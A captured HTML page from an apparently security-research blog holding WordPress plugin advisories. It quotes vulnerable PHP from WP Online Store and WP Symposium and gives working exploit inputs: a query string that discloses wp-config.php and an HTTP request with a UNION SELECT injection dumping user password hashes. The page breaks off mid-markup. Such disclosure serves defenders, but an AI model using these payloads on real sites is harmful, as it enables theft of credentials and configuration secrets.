class="crayon-e">getenv</span><span class="crayon-sy">(</span><span class="crayon-s">'HTTPS'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'NONSSL'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-124"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-125">&nbsp;</div><div class="crayon-line" id="crayon-53c9877859eb1262730049-126"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-127">&nbsp;</div><div class="crayon-line" id="crayon-53c9877859eb1262730049-128"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">request_type</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'SSL'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-e">isset</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-129">&nbsp;</div><div class="crayon-line" id="crayon-53c9877859eb1262730049-130"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_id</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'osCsid'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-131">&nbsp;</div><div class="crayon-line" id="crayon-53c9877859eb1262730049-132"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-133"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">//if (!session_id())</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-134"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-135"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ob_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-136"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'force'</span><span class="crayon-sy">]</span><span class="crayon-o">==</span><span class="crayon-s">'downloadnow'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-137"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-type: application/x-octet-stream'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-138"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">header</span><span class="crayon-sy">(</span><span class="crayon-s">'Content-disposition: attachment; filename='</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-139">&nbsp;</div><div class="crayon-line" id="crayon-53c9877859eb1262730049-140"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">readfile</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'turl'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_REQUEST</span><span class="crayon-sy">[</span><span class="crayon-s">'file'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-141"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// unlink($_REQUEST['turl'] . $_REQUEST['backup_file']);</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-142">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-143"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c9877859eb1262730049-144"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">wp_enqueue_script</span><span class="crayon-sy">(</span><span class="crayon-s">'jquery'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9877859eb1262730049-145"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0066 seconds] -->
<p>The interesting thing is that on line 136 is checks the &#8220;force&#8221; request variable to see if it matches to &#8220;downloadnow&#8221;. If it is set, it will change the content type of the response to be a download, and then read the file set by the request variables &#8220;turl&#8221; and &#8220;file&#8221; and write that to the response. These variables are however not sanitized, which leads to an arbitrary file disclosure. We can exploit this by making a request to any page with following querystring, which will force the browser to download a page containing the contents of the wp-config.php file at the top of the file:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9877859eb9291730327" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
?force=downloadnow&amp;turl=./&amp;file=wp-config.php</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9877859eb9291730327-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9877859eb9291730327-1"><span class="crayon-sy">?</span><span class="crayon-v">force</span><span class="crayon-o">=</span><span class="crayon-i">downloadnow</span><span class="crayon-o">&amp;</span><span class="crayon-v">turl</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-o">/</span><span class="crayon-o">&amp;</span><span class="crayon-v">file</span><span class="crayon-o">=</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-v">config</span><span class="crayon-sy">.</span><span class="crayon-i">php</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>&nbsp;</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>, <a href="https://charlieeriksen.github.io/tag/wp-online-store/" rel="tag">WP Online Store</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2013/02/18/wordpress-online-store-arbitrary-file-disclosure/#respond" title="Comment on WordPress Online Store arbitrary file disclosure">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-152 -->

				
					
<article id="post-132" class="post-132 post type-post status-publish format-standard hentry category-advisories tag-sql-injection tag-symposium tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/" title="10:33 am" rel="bookmark" class="entry-date"><time datetime="2013-02-18T10:33:09+00:00" pubdate>February 18, 2013</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2013/02/18/wp-symposium-multiple-sql-injection/" title="Permalink to WP Symposium multiple SQL injection vulnerabilities" rel="bookmark">WP Symposium multiple SQL injection vulnerabilities</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong></p>
<p><a href="http://secunia.com/advisories/50674/">Secunia Advisory SA50674</a></p>
<p><strong>Analysis of groups get_user_list SQL injection vulnerability</strong></p>
<p>This first vulnerability in the <a href="http://plugins.svn.wordpress.org/wp-symposium/tags/12.09/ajax/symposium_groups_functions.php">/ajax/symposium_groups_functions.php</a> file makes use of the functionality for people to view the users of a group. It accepts a groupID(gid) which it inserts without validation into a query and then spits out the result, even if you are not authenticated.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a53d906034955" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Get group members
if ($_POST['action'] == 'get_group_members') {

	$gid = $_POST['gid'];

	// First clean up the table, making sure there are no user ID = 0 (do across all groups)
	$sql = "DELETE FROM ".$wpdb-&gt;prefix."symposium_group_members WHERE member_id = 0";
	$wpdb-&gt;query($sql);

	// Now get the members
	$sql = "SELECT u.ID, u.display_name, u.user_login FROM ".$wpdb-&gt;prefix."symposium_group_members m
			LEFT JOIN ".$wpdb-&gt;base_prefix."users u ON m.member_id = u.ID
			WHERE group_id = ".$gid." AND m.admin != 'on'
			ORDER BY u.display_name";
	$users = $wpdb-&gt;get_results($sql);

	$html = '';
	if ($users) {
		foreach ($users as $user) {
			$html .= '&lt;div class="user_list_item" id="'.$user-&gt;ID.'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;';
			$html .= "&lt;img src='".get_option('symposium_images')."/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; ";
			$html .= $user-&gt;display_name.' ('.$user-&gt;ID.')';
			$html .= '&lt;/div&gt;';
		}	
	}

	echo $html;
	exit;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a53d906034955-218">218</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-219">219</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-220">220</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-221">221</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-222">222</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-223">223</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-224">224</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-225">225</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-226">226</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-227">227</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-228">228</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-229">229</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-230">230</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-231">231</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-232">232</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-233">233</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-234">234</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-235">235</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-236">236</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-237">237</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-238">238</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-239">239</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-240">240</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-241">241</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-242">242</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-243">243</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-244">244</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a53d906034955-245">245</div><div class="crayon-num" data-line="crayon-53c987785a53d906034955-246">246</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a53d906034955-218"><span class="crayon-c">// Get group members</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-219"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'get_group_members'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-220">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-221"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$gid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'gid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-222">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-223"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// First clean up the table, making sure there are no user ID = 0 (do across all groups)</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-224"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"DELETE FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members WHERE member_id = 0"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-225"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-226">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-227"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Now get the members</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-228"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"SELECT u.ID, u.display_name, u.user_login FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_group_members m</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-229"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LEFT JOIN "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"users u ON m.member_id = u.ID</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-230"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WHERE group_id = "</span><span class="crayon-sy">.</span><span class="crayon-v">$gid</span><span class="crayon-sy">.</span><span class="crayon-s">" AND m.admin != 'on'</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-231"><span class="crayon-s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ORDER BY u.display_name"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-232"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_results</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-233">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a53d906034955-234"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">''</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-235"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-236"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">foreach</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$users</span><span class="crayon-h"> </span><span class="crayon-st">as</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-237"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;div class="user_list_item" id="'</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">'" style="clear:both; cursor:pointer; float:left; border:1px solid #aaa; background-color:#ccc;margin-bottom:2px;padding:2px;margin-right:2px;"&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-238"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"&lt;img src='"</span><span class="crayon-sy">.</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_images'</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"/cross.png' style='width:12px; height:12px; float:right; margin-left:3px;' alt='add' /&gt; "</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-239"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-i">display_name</span><span class="crayon-sy">.</span><span class="crayon-s">' ('</span><span class="crayon-sy">.</span><span class="crayon-v">$user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">')'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-240"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$html</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'&lt;/div&gt;'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-241"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-242"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-243">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a53d906034955-244"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">echo</span><span class="crayon-h"> </span><span class="crayon-v">$html</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a53d906034955-245"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a53d906034955-246"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0084 seconds] -->
<p>Because it uses multiple line, we have to do a bit more work than the other ones. We can craft an union select which fits in and uses the rest of the query without a problem like this, and dump a list of usernames and password hashes:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a549148973825" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_groups_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 130

action=get_user_list&amp;gid=353234) AND 1=2 UNION SELECT user_pass, 2, 3, 4, 5, 6, 7, 8, 9, display_name, 11 FROM wp_users WHERE (1=1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
